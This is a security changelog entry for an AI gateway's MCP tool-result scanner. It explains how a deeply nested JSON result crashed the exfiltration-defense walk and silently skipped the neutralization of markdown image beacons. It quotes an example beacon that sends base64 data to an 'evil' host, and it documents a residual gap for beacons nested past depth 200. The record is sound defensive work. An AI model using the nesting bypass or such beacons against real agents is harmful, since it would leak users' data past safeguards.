# CHG-0114 — deep-nested JSON result DoS in _neutralize_exfil_deep (unbounded walk → RecursionError → silently skipped exfil defense)

**Change-id:** CHG-0114
**Date:** 2026-07-03
**Severity:** MEDIUM (fail-open DoS — a deeply-nested untrusted MCP result crashed the render-leak walk with `RecursionError`, which tier1 SWALLOWED, so the exfil-beacon / markdown-split neutralization was SILENTLY SKIPPED for that result; also a per-call stack-exhaustion vector).
**Area:** HARDEN 1.4 — render-leak / exfil defense + resource-bomb containment. Self-correction of the backstop's own CHG-0097.
**Files:** `gateway/ai_mesh_gateway/mcp_scan_orchestrator.py` (`_neutralize_exfil_deep` + `_MAX_EXFIL_WALK_DEPTH`); `gateway/ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py` (+6 tests).
**Whose work it touches:** the owning-session orchestrator `_neutralize_exfil_deep` — introduced by backstop CHG-0097.

## Root cause

`_neutralize_exfil_deep` (CHG-0097) makes the render-leak neutralization robust to JSON serialization: it parses
the WHOLE result payload and neutralizes each string leaf (exfil beacons / encoded-PII / markdown-split PII), then
re-serializes. The per-leaf walk recursed with NO depth bound:

```python
try:
    obj = _json.loads(text)     # <-- only THIS was guarded
except Exception:
    return _neutralize_render_leaks(text)

def _walk(o):                   # <-- UNBOUNDED recursion, NOT guarded
    if isinstance(o, list): return [_walk(x) for x in o]
    if isinstance(o, dict): return {k: _walk(v) for k, v in o.items()}
    ...
obj = _walk(obj)                # RecursionError on deep input
return _json.dumps(obj) ...
```

CPython's `json.loads` C scanner PARSES very deeply-nested JSON (thousands deep) that the Python-level `_walk` then
cannot traverse — the default recursion limit is ~1000. So a tool result nested a few thousand deep raised
`RecursionError` inside `_walk` (NOT `json.loads`, which the C scanner handles), and the `try/except` covered only
`json.loads` — so the `RecursionError` propagated to tier1's exfil block, which swallowed it and continued. Net
effect: for a deeply-nested result the render-leak neutralization was **silently skipped** (a fail-OPEN of the
CHG-0096–0099 exfil defense), plus a per-call stack-exhaustion (DoS) vector on an untrusted-controlled payload.

### Byte-level truth (pre-fix)

`_neutralize_exfil_deep(json.dumps(nested(6000)))` → **RecursionError**. Driving the full result floor on the same
deep content returned clean (`blocked=False`, no findings) — i.e. the exfil check was bypassed, not enforced.

## The fix (CHG-0114)

1. **Depth-bound the walk** — `_walk(o, _depth=0)` returns the subtree as-is once `_depth >= _MAX_EXFIL_WALK_DEPTH`
   (`200`, env `MCP_EXFIL_WALK_MAX_DEPTH`). 200 is far beyond any realistic MCP result nesting and well under the
   ~1000 stack limit; a render-time beacon nested this deep cannot reconstruct client-side anyway, and the whole
   serialized text is still tier1-scanned by the other detectors.
2. **Fail-safe the walk + re-serialize** — wrap `_walk(obj)` + `json.dumps(obj)` in `try/except` → fall back to the
   string-level `_neutralize_render_leaks(text)` on `RecursionError` (or any error, e.g. a very deep past-cap `obj`
   still tripping `json.dumps`). The scan can NEVER raise a `RecursionError` into the pipeline.

So a deeply-nested untrusted result can no longer exhaust the Python stack NOR silently disable the render-leak
defense; realistic (shallow) beacons are still defanged exactly as before.

### Byte-level truth (post-fix)

- `_neutralize_exfil_deep(json.dumps(nested(20000)))` → returns a `str` (no RecursionError).
- `{"a":{"b":{"c":"see ![x](https://evil…?d=<b64>)"}}}` → `see [x](https://evil…/[exfil-redacted])` (auto-render stripped).
- beacon nested at depth 150 (< cap) → defanged.
- beacon nested at depth 400 (> cap) → no crash (walk skips deeper).
- full result floor on an 8000-deep result → returns cleanly, no exception.

## Verification (all green)

```
cd gateway
./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py -q   # 33 passed (27 + 6 new)
./.venv/bin/python -m pytest ai_mesh_gateway/tests -q                                          # 1699 passed, 0 failed
```

6 new tests: deep nest 2000/6000/20000 → no RecursionError; shallow + depth-150 beacons still defanged; full floor
survives an 8000-deep result. Broker unaffected (gateway-orchestrator change).

## Scope / honesty note

DoS + fail-open fix on the exfil-defense render walk — self-correction of CHG-0097. **Oracle:** N/A — this is a
stack-exhaustion + beacon-defang fix, not a PII-text leak (aidefence doesn't classify beacons/nesting), so the
no-RecursionError + beacon-absent byte assertions are authoritative. **RESIDUAL (documented):** a beacon nested PAST
the 200 cap is not per-leaf-defanged — but such depth is not a realistic client auto-render vector (a client would
have to extract and render a value 200+ levels deep), and closing the stack-exhaustion DoS + restoring the defense
for realistic depths is the priority. Does not change the host-blocked live-stress status (items 14–20). Partial
coverage is not completion.
